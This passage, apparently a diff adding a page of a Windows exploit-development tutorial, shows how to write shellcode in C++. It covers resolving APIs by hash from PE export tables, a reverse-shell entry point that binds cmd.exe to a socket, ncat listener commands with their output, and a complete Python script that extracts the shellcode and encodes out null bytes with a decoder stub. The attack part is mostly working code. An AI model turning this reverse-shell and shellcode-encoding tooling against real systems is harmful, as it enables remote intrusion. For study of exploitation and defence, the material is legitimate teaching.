+    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
+    IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader-&gt;e_lfanew);
+    DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!iedRVA)                // Export Directory not present
+        continue;
+    IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
+    char *moduleName = (char *)(baseAddress + ied-&gt;Name);
+    DWORD moduleHash = getHash(moduleName);
+
+    // The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th
+    // element of both arrays refer to the same function. The first array specifies the name whereas
+    // the second the ordinal. This ordinal can then be used as an index in the array pointed to by
+    // AddressOfFunctions to find the entry point of the function.
+    DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);
+    for (DWORD i = 0; i &lt; ied-&gt;NumberOfNames; ++i) {
+        char *functionName = (char *)(baseAddress + nameRVAs[i]);
+        if (hash == moduleHash + getHash(functionName)) {
+            WORD ordinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];
+            DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];
+            return baseAddress + functionRVA;
+        }
+    }
+    .
+    .
+    .
+</code></pre>
+    
+    <p>To understand this piece of code you’ll need to have a look at the PE file format specification. I won’t go into too many details. One important thing you should know is that many (if not all) the addresses in the PE file structures are <span style="color: #00ccff;">RVA</span> (<span style="color: #00ccff;">R</span>elative <span style="color: #00ccff;">V</span>irtual <span style="color: #00ccff;">A</span>ddresses), i.e. addresses relative to the base address of the PE module (DllBase). For example, if the RVA is 100h and DllBase is 400000h, then the RVA points to data at the address 400000h + 100h = 400100h.</p><p>The module starts with the so called <span style="color: #00ff00;">DOS_HEADER</span> which contains a RVA (<span style="color: #00ff00;">e_lfanew</span>) to the <span style="color: #00ff00;">NT_HEADERS</span> which are the <span style="color: #00ff00;">FILE_HEADER</span> and the <span style="color: #00ff00;">OPTIONAL_HEADER</span>. The <span style="color: #00ff00;">OPTIONAL_HEADER</span> contains an array called <span style="color: #00ff00;">DataDirectory</span> which points to various “directories” of the PE module. We are interested in the <span style="color: #00ccff;">Export Directory</span>.<br> The C structure associated with the Export Directory is defined as follows:</p>
+    
+<pre><code class="language-cpp">typedef struct _IMAGE_EXPORT_DIRECTORY {
+    DWORD   Characteristics;
+    DWORD   TimeDateStamp;
+    WORD    MajorVersion;
+    WORD    MinorVersion;
+    DWORD   Name;
+    DWORD   Base;
+    DWORD   NumberOfFunctions;
+    DWORD   NumberOfNames;
+    DWORD   AddressOfFunctions;     // RVA from base of image
+    DWORD   AddressOfNames;         // RVA from base of image
+    DWORD   AddressOfNameOrdinals;  // RVA from base of image
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+</code></pre>
+
+<p>The field <span style="color: #00ff00;">Name</span> is a RVA to a string containing the name of the module. Then there are 5 important fields:</p><ul><li><span style="color: #00ff00;">NumberOfFunctions</span>:<br> number of elements in AddressOfFunctions.</li><li><span style="color: #00ff00;">NumberOfNames</span>:<br> number of elements in AddressOfNames.</li><li><span style="color: #00ff00;">AddressOfFunctions</span>:<br> RVA to an array of RVAs (DWORDs) to the entrypoints of the exported functions.</li><li><span style="color: #00ff00;">AddressOfNames</span>:<br> RVA to an array of RVAs (DWORDs) to the names of the exported functions.</li><li><span style="color: #00ff00;">AddressOfNameOrdinals</span>:<br> RVA to an array of ordinals (WORDs) associated with the exported functions.</li></ul><p>As the comments in the C/C++ code say, the arrays pointed to by <span style="color: #00ff00;">AddressOfNames</span> and <span style="color: #00ff00;">AddressOfNameOrdinals</span> run in parallel:<br> 
+<a href="images/pic_a0b.png"><img src="images/pic_a0b.png" alt="pic_a0b" width="981" height="257"></a>
+<br> While the first two arrays run in parallel, the third doesn’t and the ordinals taken from <span style="color: #00ff00;">AddressOfNameOrdinals</span> are indices in the array <span style="color: #00ff00;">AddressOfFunctions</span>.</p><p>So the idea is to first find the right name in <span style="color: #00ff00;">AddressOfNames</span>, then get the corresponding ordinal in <span style="color: #00ff00;">AddressOfNameOrdinals</span> (at the same position) and finally use the ordinal as index in <span style="color: #00ff00;">AddressOfFunctions</span> to get the RVA of the corresponding exported function.</p><h3>DefineFuncPtr</h3><p><span style="color: #00ff00;">DefineFuncPtr</span> is a handy macro which helps define a pointer to an imported function. Here’s an example:</p>
+
+<pre><code class="language-cpp">#define HASH_WSAStartup           0x2ddcd540
+
+#define DefineFuncPtr(name)       decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
+
+DefineFuncPtr(WSAStartup);
+</code></pre>
+
+<p><span style="color: #00ff00;">WSAStartup</span> is a function imported from <span style="color: #00ff00;">ws2_32.dll</span>, so <span style="color: #00ff00;">HASH_WSAStartup</span> is computed this way:</p>
+
+<pre><code class="language-cpp">DWORD hash = getFunctionHash("ws2_32.dll", "WSAStartup");
+</code></pre>
+
+<p>When the macro is expanded,</p>
+
+<pre><code class="language-cpp">DefineFuncPtr(WSAStartup);
+</code></pre>
+
+<p>becomes</p>
+
+<pre><code class="language-cpp">decltype(WSAStartup) *My_WSAStartup = (decltype(WSAStartup) *)getProcAddrByHash(HASH_WSAStartup)
+</code></pre>
+
+<p>where <span style="color: #00ff00;">decltype(WSAStartup)</span> is the type of the function <span style="color: #00ff00;">WSAStartup</span>. This way we don’t need to redefine the function prototype. Note that <span style="color: #00ff00;">decltype</span> was introduced in C++11.</p><p>Now we can call <span style="color: #00ff00;">WSAStartup</span> through <span style="color: #00ff00;">My_WSAStartup</span> and intellisense will work perfectly.</p><p>Note that before importing a function from a module, we need to make sure that that module is already loaded in memory. While <span style="color: #00ff00;">kernel32.dll</span> and <span style="color: #00ff00;">ntdll.dll</span> are always present (lucky for us), we can’t assume that other modules are. The easiest way to load a module is to use <span style="color: #00ff00;">LoadLibrary</span>:</p>
+
+<pre><code class="language-cpp">  DefineFuncPtr(LoadLibraryA);
+  My_LoadLibraryA("ws2_32.dll");
+</code></pre>
+  
+  <p>This works because <span style="color: #00ff00;">LoadLibrary</span> is imported from <span style="color: #00ff00;">kernel32.dll</span> that, as we said, is always present in memory.</p><p>We could also import <span style="color: #00ff00;">GetProcAddress</span> and use it to get the address of all the other function we need, but that would be wasteful because we would need to include the full names of the functions in the shellcode.</p><h3>entryPoint</h3><p><span style="color: #00ff00;">entryPoint</span> is obviously the entry point of our shellcode and implements the reverse shell. First, we import all the functions we need and then we use them. The details are not important and I must say that the winsock API are very cumbersome to use.</p><p>In a nutshell:</p><ol><li>we create a socket,</li><li>connect the socket to 127.0.0.1:123,</li><li>create a process by executing cmd.exe,</li><li>attach the socket to the standard input, output and error of the process,</li><li>wait for the process to terminate,</li><li>when the process has ended, we terminate the current thread.</li></ol><p>Point 3 and 4 are performed at the same time with a call to CreateProcess. Thanks to 4), the attacker can listen on port 123 for a connection and then, once connected, can interact with cmd.exe running on the remote machine through the socket, i.e. the TCP connection.</p><p>To try this out, install ncat (<a href="http://nmap.org/ncat/">download</a>), run cmd.exe and at the prompt enter</p><pre class="ignore:true">ncat -lvp 123</pre><p>This will start listening on port 123.<br> Then, back in Visual Studio 2013, select <span style="color: #00ff00;">Release</span>, build the project and run it.</p><p>Go back to ncat and you should see something like the following:</p><pre class="ignore:true">Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Kiuhnm&gt;ncat -lvp 123
+Ncat: Version 6.47 ( http://nmap.org/ncat )
+Ncat: Listening on :::123
+Ncat: Listening on 0.0.0.0:123
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:4409.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Kiuhnm\documents\visual studio 2013\Projects\shellcode\shellcode&gt;</pre><p>Now you can type whatever command you want. To exit, type <span style="color: #00ff00;">exit</span>.</p><h3>main</h3><p>Thanks to the linker option</p><p style="padding-left: 30px;"><span style="color: #00ff00;">Function Order</span>: function_order.txt</p><p>where the first and only line of function_order.txt is <span style="color: #00ff00;">?entryPoint@@YAHXZ</span>, the function <span style="color: #00ff00;">entryPoint</span> will be positioned first in our shellcode. This is what we want.</p><p>It seems that the linker honors the order of the functions in the source code, so we could have put <span style="color: #00ff00;">entryPoint</span> before any other function, but I didn’t want to mess things up. The main function comes last in the source code so it’s linked at the end of our shellcode. This allows us to tell where the shellcode ends. We’ll see how in a moment when we talk about the map file.</p><h2>Python script</h2><h3>Introduction</h3><p>Now that the executable containing our shellcode is ready, we need a way to extract and fix the shellcode. This won’t be easy. I wrote a Python script that</p><ol><li>extracts the shellcode</li><li>handles the relocations for the strings</li><li>fixes the shellcode by removing null bytes</li></ol><p>By the way, you can use whatever you like, but I like and use <span style="color: #00ccff;">PyCharm</span> (<a href="https://www.jetbrains.com/pycharm/">download</a>).</p><p>The script weighs only 392 LOC, but it’s a little tricky so I’ll explain it in detail.</p><p>Here’s the <a href="code/extractor.py">code</a>:</p>
+
+<pre><code class="language-python"># Shellcode extractor by Massimiliano Tomassoli (2015)
+
+import sys
+import os
+import datetime
+import pefile
+
+author = 'Massimiliano Tomassoli'
+year = datetime.date.today().year
+
+
+def dword_to_bytes(value):
+    return [value &amp; 0xff, (value &gt;&gt; 8) &amp; 0xff, (value &gt;&gt; 16) &amp; 0xff, (value &gt;&gt; 24) &amp; 0xff]
+
+
+def bytes_to_dword(bytes):
+    return (bytes[0] &amp; 0xff) | ((bytes[1] &amp; 0xff) &lt;&lt; 8) | \
+           ((bytes[2] &amp; 0xff) &lt;&lt; 16) | ((bytes[3] &amp; 0xff) &lt;&lt; 24)
+
+
+def get_cstring(data, offset):
+    '''
+    Extracts a C string (i.e. null-terminated string) from data starting from offset.
+    '''
+    pos = data.find('\0', offset)
+    if pos == -1:
+        return None
+    return data[offset:pos+1]
+
+
+def get_shellcode_len(map_file):
+    '''
+    Gets the length of the shellcode by analyzing map_file (map produced by VS 2013)
+    '''
+    try:
+        with open(map_file, 'r') as f:
+            lib_object = None
+            shellcode_len = None
+            for line in f:
+                parts = line.split()
+                if lib_object is not None:
+                    if parts[-1] == lib_object:
+                        raise Exception('_main is not the last function of %s' % lib_object)
+                    else:
+                        break
+                elif (len(parts) &gt; 2 and parts[1] == '_main'):
+                    # Format:
+                    # 0001:00000274  _main   00401274 f   shellcode.obj
+                    shellcode_len = int(parts[0].split(':')[1], 16)
+                    lib_object = parts[-1]
+
+            if shellcode_len is None:
+                raise Exception('Cannot determine shellcode length')
+    except IOError:
+        print('[!] get_shellcode_len: Cannot open "%s"' % map_file)
+        return None
+    except Exception as e:
+        print('[!] get_shellcode_len: %s' % e.message)
+        return None
+
+    return shellcode_len
+
+
+def get_shellcode_and_relocs(exe_file, shellcode_len):
+    '''
+    Extracts the shellcode from the .text section of the file exe_file and the string
+    relocations.
+    Returns the triple (shellcode, relocs, addr_to_strings).
+    '''
+    try:
+        # Extracts the shellcode.
+        pe = pefile.PE(exe_file)
+        shellcode = None
+        rdata = None
+        for s in pe.sections:
+            if s.Name == '.text\0\0\0':
+                if s.SizeOfRawData &lt; shellcode_len:
+                    raise Exception('.text section too small')
+                shellcode_start = s.VirtualAddress
+                shellcode_end = shellcode_start + shellcode_len
+                shellcode = pe.get_data(s.VirtualAddress, shellcode_len)
+            elif s.Name == '.rdata\0\0':
+                rdata_start = s.VirtualAddress
+                rdata_end = rdata_start + s.Misc_VirtualSize
+                rdata = pe.get_data(rdata_start, s.Misc_VirtualSize)
+
+        if shellcode is None:
+            raise Exception('.text section not found')
+        if rdata is None:
+            raise Exception('.rdata section not found')
+
+        # Extracts the relocations for the shellcode and the referenced strings in .rdata.
+        relocs = []
+        addr_to_strings = {}
+        for rel_data in pe.DIRECTORY_ENTRY_BASERELOC:
+            for entry in rel_data.entries[:-1]:         # the last element's rvs is the base_rva (why?)
+                if shellcode_start &lt;= entry.rva &lt; shellcode_end:
+                    # The relocation location is inside the shellcode.
+                    relocs.append(entry.rva - shellcode_start)      # offset relative to the start of shellcode
+                    string_va = pe.get_dword_at_rva(entry.rva)
+                    string_rva = string_va - pe.OPTIONAL_HEADER.ImageBase
+                    if string_rva &lt; rdata_start or string_rva &gt;= rdata_end:
+                        raise Exception('shellcode references a section other than .rdata')
+                    str = get_cstring(rdata, string_rva - rdata_start)
+                    if str is None:
+                        raise Exception('Cannot extract string from .rdata')
+                    addr_to_strings[string_va] = str
+
+        return (shellcode, relocs, addr_to_strings)
+
+    except WindowsError:
+        print('[!] get_shellcode: Cannot open "%s"' % exe_file)
+        return None
+    except Exception as e:
+        print('[!] get_shellcode: %s' % e.message)
+        return None
+
+
+def dword_to_string(dword):
+    return ''.join([chr(x) for x in dword_to_bytes(dword)])
+
+
+def add_loader_to_shellcode(shellcode, relocs, addr_to_strings):
+    if len(relocs) == 0:
+        return shellcode                # there are no relocations
+
+    # The format of the new shellcode is:
+    #       call    here
+    #   here:
+    #       ...
+    #   shellcode_start:
+    #       &lt;shellcode&gt;         (contains offsets to strX (offset are from "here" label))
+    #   relocs:
+    #       off1|off2|...       (offsets to relocations (offset are from "here" label))
+    #       str1|str2|...
+
+    delta = 21                                      # shellcode_start - here
+
+    # Builds the first part (up to and not including the shellcode).
+    x = dword_to_bytes(delta + len(shellcode))
+    y = dword_to_bytes(len(relocs))
+    code = [
+        0xE8, 0x00, 0x00, 0x00, 0x00,               #   CALL here
+                                                    # here:
+        0x5E,                                       #   POP ESI
+        0x8B, 0xFE,                                 #   MOV EDI, ESI
+        0x81, 0xC6, x[0], x[1], x[2], x[3],         #   ADD ESI, shellcode_start + len(shellcode) - here
+        0xB9, y[0], y[1], y[2], y[3],               #   MOV ECX, len(relocs)
+        0xFC,                                       #   CLD
+                                                    # again:
+        0xAD,                                       #   LODSD
+        0x01, 0x3C, 0x07,                           #   ADD [EDI+EAX], EDI
+        0xE2, 0xFA                                  #   LOOP again
+                                                    # shellcode_start:
+    ]
+
+    # Builds the final part (offX and strX).
+    offset = delta + len(shellcode) + len(relocs) * 4           # offset from "here" label
+    final_part = [dword_to_string(r + delta) for r in relocs]
+    addr_to_offset = {}
+    for addr in addr_to_strings.keys():
+        str = addr_to_strings[addr]
+        final_part.append(str)
+        addr_to_offset[addr] = offset
+        offset += len(str)
+
+    # Fixes the shellcode so that the pointers referenced by relocs point to the
+    # string in the final part.
+    byte_shellcode = [ord(c) for c in shellcode]
+    for off in relocs:
+        addr = bytes_to_dword(byte_shellcode[off:off+4])
+        byte_shellcode[off:off+4] = dword_to_bytes(addr_to_offset[addr])
+
+    return ''.join([chr(b) for b in (code + byte_shellcode)]) + ''.join(final_part)
+
+
+def dump_shellcode(shellcode):
+    '''
+    Prints shellcode in C format ('\x12\x23...')
+    '''
+    shellcode_len = len(shellcode)
+    sc_array = []
+    bytes_per_row = 16
+    for i in range(shellcode_len):
+        pos = i % bytes_per_row
+        str = ''
+        if pos == 0:
+            str += '"'
+        str += '\\x%02x' % ord(shellcode[i])
+        if i == shellcode_len - 1:
+            str += '";\n'
+        elif pos == bytes_per_row - 1:
+            str += '"\n'
+        sc_array.append(str)
+    shellcode_str = ''.join(sc_array)
+    print(shellcode_str)
+
+
+def get_xor_values(value):
+    '''
+    Finds x and y such that:
+    1) x xor y == value
+    2) x and y doesn't contain null bytes
+    Returns x and y as arrays of bytes starting from the lowest significant byte.
+    '''
+
+    # Finds a non-null missing bytes.
+    bytes = dword_to_bytes(value)
+    missing_byte = [b for b in range(1, 256) if b not in bytes][0]
+
+    xor1 = [b ^ missing_byte for b in bytes]
+    xor2 = [missing_byte] * 4
+    return (xor1, xor2)
+
+
+def get_fixed_shellcode_single_block(shellcode):
+    '''
+    Returns a version of shellcode without null bytes or None if the
+    shellcode can't be fixed.
+    If this function fails, use get_fixed_shellcode().
+    '''
+
+    # Finds one non-null byte not present, if any.
+    bytes = set([ord(c) for c in shellcode])
+    missing_bytes = [b for b in range(1, 256) if b not in bytes]
+    if len(missing_bytes) == 0:
+        return None                             # shellcode can't be fixed
+    missing_byte = missing_bytes[0]
+
+    (xor1, xor2) = get_xor_values(len(shellcode))
+
+    code = [
+        0xE8, 0xFF, 0xFF, 0xFF, 0xFF,                       #   CALL $ + 4
+                                                            # here:
+        0xC0,                                               #   (FF)C0 = INC EAX
+        0x5F,                                               #   POP EDI
+        0xB9, xor1[0], xor1[1], xor1[2], xor1[3],           #   MOV ECX, &lt;xor value 1 for shellcode len&gt;
+        0x81, 0xF1, xor2[0], xor2[1], xor2[2], xor2[3],     #   XOR ECX, &lt;xor value 2 for shellcode len&gt;
+        0x83, 0xC7, 29,                                     #   ADD EDI, shellcode_begin - here
+        0x33, 0xF6,                                         #   XOR ESI, ESI
+        0xFC,                                               #   CLD
+                                                            # loop1:
+        0x8A, 0x07,                                         #   MOV AL, BYTE PTR [EDI]
+        0x3C, missing_byte,                                 #   CMP AL, &lt;missing byte&gt;
+        0x0F, 0x44, 0xC6,                                   #   CMOVE EAX, ESI
+        0xAA,                                               #   STOSB
+        0xE2, 0xF6                                          #   LOOP loop1
+                                                            # shellcode_begin:
+    ]
+
+    return ''.join([chr(x) for x in code]) + shellcode.replace('\0', chr(missing_byte))
+
+
+def get_fixed_shellcode(shellcode):
+    '''
+    Returns a version of shellcode without null bytes. This version divides
+    the shellcode into multiple blocks and should be used only if
+    get_fixed_shellcode_single_block() doesn't work with this shellcode.
+    '''
+
+    # The format of bytes_blocks is
+    #   [missing_byte1, number_of_blocks1,
+    #    missing_byte2, number_of_blocks2, ...]
+    # where missing_byteX is the value used to overwrite the null bytes in the
+    # shellcode, while number_of_blocksX is the number of 254-byte blocks where
+    # to use the corresponding missing_byteX.
+    bytes_blocks = []
+    shellcode_len = len(shellcode)
+    i = 0
+    while i &lt; shellcode_len:
+        num_blocks = 0
+        missing_bytes = list(range(1, 256))
+
+        # Tries to find as many 254-byte contiguous blocks as possible which misses at
+        # least one non-null value. Note that a single 254-byte block always misses at
+        # least one non-null value.
+        while True:
+            if i &gt;= shellcode_len or num_blocks == 255:
+                bytes_blocks += [missing_bytes[0], num_blocks]
+                break
+            bytes = set([ord(c) for c in shellcode[i:i+254]])
+            new_missing_bytes = [b for b in missing_bytes if b not in bytes]
+            if len(new_missing_bytes) != 0:         # new block added
+                missing_bytes = new_missing_bytes
+                num_blocks += 1
+                i += 254
+            else:
+                bytes += [missing_bytes[0], num_blocks]
+                break
+
+    if len(bytes_blocks) &gt; 0x7f - 5:
+        # Can't assemble "LEA EBX, [EDI + (bytes-here)]" or "JMP skip_bytes".
+        return None
+
+    (xor1, xor2) = get_xor_values(len(shellcode))
+
+    code = ([
+        0xEB, len(bytes_blocks)] +                          #   JMP SHORT skip_bytes
+                                                            # bytes:
+        bytes_blocks + [                                    #   ...
+                                                            # skip_bytes:
+        0xE8, 0xFF, 0xFF, 0xFF, 0xFF,                       #   CALL $ + 4
+                                                            # here:
+        0xC0,                                               #   (FF)C0 = INC EAX
+        0x5F,                                               #   POP EDI
+        0xB9, xor1[0], xor1[1], xor1[2], xor1[3],           #   MOV ECX, &lt;xor value 1 for shellcode len&gt;
+        0x81, 0xF1, xor2[0], xor2[1], xor2[2], xor2[3],     #   XOR ECX, &lt;xor value 2 for shellcode len&gt;
+        0x8D, 0x5F, -(len(bytes_blocks) + 5) &amp; 0xFF,        #   LEA EBX, [EDI + (bytes - here)]
+        0x83, 0xC7, 0x30,                                   #   ADD EDI, shellcode_begin - here
+                                                            # loop1:
+        0xB0, 0xFE,                                         #   MOV AL, 0FEh
+        0xF6, 0x63, 0x01,                                   #   MUL AL, BYTE PTR [EBX+1]
+        0x0F, 0xB7, 0xD0,                                   #   MOVZX EDX, AX
+        0x33, 0xF6,                                         #   XOR ESI, ESI
+        0xFC,                                               #   CLD
+                                                            # loop2:
+        0x8A, 0x07,                                         #   MOV AL, BYTE PTR [EDI]
+        0x3A, 0x03,                                         #   CMP AL, BYTE PTR [EBX]
+        0x0F, 0x44, 0xC6,                                   #   CMOVE EAX, ESI
+        0xAA,                                               #   STOSB
+        0x49,                                               #   DEC ECX
+        0x74, 0x07,                                         #   JE shellcode_begin
+        0x4A,                                               #   DEC EDX
+        0x75, 0xF2,                                         #   JNE loop2
+        0x43,                                               #   INC EBX
+        0x43,                                               #   INC EBX
+        0xEB, 0xE3                                          #   JMP loop1
+                                                            # shellcode_begin:
+    ])
+
+    new_shellcode_pieces = []
+    pos = 0
+    for i in range(len(bytes_blocks) / 2):
+        missing_char = chr(bytes_blocks[i*2])
+        num_bytes = 254 * bytes_blocks[i*2 + 1]
+        new_shellcode_pieces.append(shellcode[pos:pos+num_bytes].replace('\0', missing_char))
+        pos += num_bytes
+
+    return ''.join([chr(x) for x in code]) + ''.join(new_shellcode_pieces)
+
+
+def main():
+    print("Shellcode Extractor by %s (%d)\n" % (author, year))
+
+    if len(sys.argv) != 3:
+        print('Usage:\n' +
+              '  %s &lt;exe file&gt; &lt;map file&gt;\n' % os.path.basename(sys.argv[0]))
+        return
+
+    exe_file = sys.argv[1]
+    map_file = sys.argv[2]
+
+    print('Extracting shellcode length from "%s"...' % os.path.basename(map_file))
+    shellcode_len = get_shellcode_len(map_file)
+    if shellcode_len is None:
+        return
+    print('shellcode length: %d' % shellcode_len)
+
+    print('Extracting shellcode from "%s" and analyzing relocations...' % os.path.basename(exe_file))
+    result = get_shellcode_and_relocs(exe_file, shellcode_len)
+    if result is None:
+        return
+    (shellcode, relocs, addr_to_strings) = result
+
+    if len(relocs) != 0:
+        print('Found %d reference(s) to %d string(s) in .rdata' % (len(relocs), len(addr_to_strings)))
+        print('Strings:')
+        for s in addr_to_strings.values():
+            print('  ' + s[:-1])
+        print('')
+        shellcode = add_loader_to_shellcode(shellcode, relocs, addr_to_strings)
+    else:
+        print('No relocations found')
+
+    if shellcode.find('\0') == -1:
+        print('Unbelievable: the shellcode does not need to be fixed!')
+        fixed_shellcode = shellcode
+    else:
+        # shellcode contains null bytes and needs to be fixed.
+        print('Fixing the shellcode...')
+        fixed_shellcode = get_fixed_shellcode_single_block(shellcode)
+        if fixed_shellcode is None:             # if shellcode wasn't fixed...
+            fixed_shellcode = get_fixed_shellcode(shellcode)
+            if fixed_shellcode is None:
+                print('[!] Cannot fix the shellcode')
+
+    print('final shellcode length: %d\n' % len(fixed_shellcode))
+    print('char shellcode[] = ')
+    dump_shellcode(fixed_shellcode)
+
+
+main()
+</code></pre>
+
+<p></p><h3>Map file and shellcode length</h3><p>We told the linker to produce a map file with the following options:</p><ul><li><span style="color: #00ff00;">Debugging</span>:<ul><li><span style="color: #00ff00;">Generate Map File</span>: Yes (/MAP)<br> Tells the linker to generate a map file containing the structure of the EXE)</li><li><span style="color: #00ff00;">Map File Name</span>: mapfile</li></ul></li></ul><p>The map file is important to determine the shellcode length.</p><p>Here’s the relevant part of the map file:</p><pre class="ignore:true">shellcode
+
+ Timestamp is 54fa2c08 (Fri Mar 06 23:36:56 2015)
+
+ Preferred load address is 00400000
+
+ Start         Length     Name                   Class
+ 0001:00000000 00000a9cH .text$mn                CODE
+ 0002:00000000 00000094H .idata$5                DATA
+ 0002:00000094 00000004H .CRT$XCA                DATA
+ 0002:00000098 00000004H .CRT$XCAA               DATA
+ 0002:0000009c 00000004H .CRT$XCZ                DATA
+ 0002:000000a0 00000004H .CRT$XIA                DATA
+ 0002:000000a4 00000004H .CRT$XIAA               DATA
+ 0002:000000a8 00000004H .CRT$XIC                DATA
+ 0002:000000ac 00000004H .CRT$XIY                DATA
+ 0002:000000b0 00000004H .CRT$XIZ                DATA
+ 0002:000000c0 000000a8H .rdata                  DATA
+ 0002:00000168 00000084H .rdata$debug            DATA
+ 0002:000001f0 00000004H .rdata$sxdata           DATA
+ 0002:000001f4 00000004H .rtc$IAA                DATA
+ 0002:000001f8 00000004H .rtc$IZZ                DATA
+ 0002:000001fc 00000004H .rtc$TAA                DATA
+ 0002:00000200 00000004H .rtc$TZZ                DATA
+ 0002:00000208 0000005cH .xdata$x                DATA
+ 0002:00000264 00000000H .edata                  DATA
+ 0002:00000264 00000028H .idata$2                DATA
+ 0002:0000028c 00000014H .idata$3                DATA
+ 0002:000002a0 00000094H .idata$4                DATA
+ 0002:00000334 0000027eH .idata$6                DATA
+ 0003:00000000 00000020H .data                   DATA
+ 0003:00000020 00000364H .bss                    DATA
+ 0004:00000000 00000058H .rsrc$01                DATA
+ 0004:00000060 00000180H .rsrc$02                DATA
+
+  Address         Publics by Value              Rva+Base       Lib:Object
+
+ 0000:00000000       ___guard_fids_table        00000000     &lt;absolute&gt;
+ 0000:00000000       ___guard_fids_count        00000000     &lt;absolute&gt;
+ 0000:00000000       ___guard_flags             00000000     &lt;absolute&gt;
+ 0000:00000001       ___safe_se_handler_count   00000001     &lt;absolute&gt;
+ 0000:00000000       ___ImageBase               00400000     &lt;linker-defined&gt;
+ 0001:00000000       ?entryPoint@@YAHXZ         00401000 f   shellcode.obj
+ 0001:000001a1       ?getHash@@YAKPBD@Z         004011a1 f   shellcode.obj
+ 0001:000001be       ?getProcAddrByHash@@YAPAXK@Z 004011be f   shellcode.obj
+ 0001:00000266       _main                      00401266 f   shellcode.obj
+ 0001:000004d4       _mainCRTStartup            004014d4 f   MSVCRT:crtexe.obj
+ 0001:000004de       ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z 004014de f   MSVCRT:unhandld.obj
+ 0001:0000051f       ___CxxSetUnhandledExceptionFilter 0040151f f   MSVCRT:unhandld.obj
+ 0001:0000052e       __XcptFilter               0040152e f   MSVCRT:MSVCR120.dll
+<span style="color: #00ff00;">&lt;snip&gt;</span></pre><p>The start of the map file tells us that section 1 is the .text section, which contains the code:</p><pre class="ignore:true">Start         Length     Name                   Class
+0001:00000000 00000a9cH .text$mn                CODE</pre><p>The second part tells us that the <span style="color: #00ff00;">.text</span> section starts with <span style="color: #00ff00;">?entryPoint@@YAHXZ</span>, our <span style="color: #00ff00;">entryPoint</span> function, and that main (here called <span style="color: #00ff00;">_main</span>) is the last of our functions. Since <span style="color: #00ff00;">main</span> is at offset 0x266 and <span style="color: #00ff00;">entryPoint</span> is at 0, our shellcode starts at the beginning of the .text section and is 0x266 bytes long.</p><p>Here’s how we do it in Python:</p>
+
+<pre><code class="language-python">def get_shellcode_len(map_file):
+    '''
+    Gets the length of the shellcode by analyzing map_file (map produced by VS 2013)
+    '''
+    try:
+        with open(map_file, 'r') as f:
+            lib_object = None
+            shellcode_len = None
+            for line in f:
+                parts = line.split()
+                if lib_object is not None:
+                    if parts[-1] == lib_object:
+                        raise Exception('_main is not the last function of %s' % lib_object)
+                    else:
+                        break
+                elif (len(parts) &gt; 2 and parts[1] == '_main'):
+                    # Format:
+                    # 0001:00000274  _main   00401274 f   shellcode.obj
+                    shellcode_len = int(parts[0].split(':')[1], 16)
+                    lib_object = parts[-1]
+
+            if shellcode_len is None:
+                raise Exception('Cannot determine shellcode length')
+    except IOError:
+        print('[!] get_shellcode_len: Cannot open "%s"' % map_file)
+        return None
+    except Exception as e:
+        print('[!] get_shellcode_len: %s' % e.message)
+        return None
+
+    return shellcode_len
+</code></pre>
+    
+    <p></p><h3>extracting the shellcode</h3><p>This part is very easy. We know the shellcode length and that the shellcode is located at the beginning of the <span style="color: #00ff00;">.text</span> section. Here’s the code:</p>
+    
+<pre><code class="language-python">def get_shellcode_and_relocs(exe_file, shellcode_len):
+    '''
+    Extracts the shellcode from the .text section of the file exe_file and the string
+    relocations.
+    Returns the triple (shellcode, relocs, addr_to_strings).
+    '''
+    try:
+        # Extracts the shellcode.
+        pe = pefile.PE(exe_file)
+        shellcode = None
+        rdata = None
+        for s in pe.sections:
+            if s.Name == '.text\0\0\0':
+                if s.SizeOfRawData &lt; shellcode_len:
+                    raise Exception('.text section too small')
+                shellcode_start = s.VirtualAddress
+                shellcode_end = shellcode_start + shellcode_len
+                shellcode = pe.get_data(s.VirtualAddress, shellcode_len)
+            elif s.Name == '.rdata\0\0':
+                &lt;snip&gt;
+
+        if shellcode is None:
+            raise Exception('.text section not found')
+        if rdata is None:
+            raise Exception('.rdata section not found')
+&lt;snip&gt;
+</code></pre>
+
+<p>I use the module <span style="color: #00ff00;">pefile</span> (<a href="https://code.google.com/p/pefile/">download</a>) which is quite intuitive to use. The relevant part is the body of the <span style="color: #00ff00;">if</span>.</p><h3>strings and .rdata</h3><p>As we said before, our C/C++ code may contain strings. For instance, our shellcode contains the following line:</p>
+
+<pre><code class="language-python">My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;procInfo);
+</code></pre>
+
+<p>The string <span style="color: #00ff00;">cmd.exe</span> is located in the<span style="color: #00ff00;"> .rdata</span> section, a read-only section containing initialized data. The code refers to that string using an absolute address:</p><pre class="ignore:true">00241152 50                   push        eax  
+00241153 8D 44 24 5C          lea         eax,[esp+5Ch]  
+00241157 C7 84 24 88 00 00 00 00 01 00 00 mov         dword ptr [esp+88h],100h  
+00241162 50                   push        eax  
+00241163 52                   push        edx  
+00241164 52                   push        edx  
+00241165 52                   push        edx  
+00241166 6A 01                push        1  
+00241168 52                   push        edx  
+00241169 52                   push        edx  
+0024116A 68 18 21 24 00       push        242118h         &lt;------------------------
+0024116F 52                   push        edx  
+00241170 89 B4 24 C0 00 00 00 mov         dword ptr [esp+0C0h],esi  
+00241177 89 B4 24 BC 00 00 00 mov         dword ptr [esp+0BCh],esi  
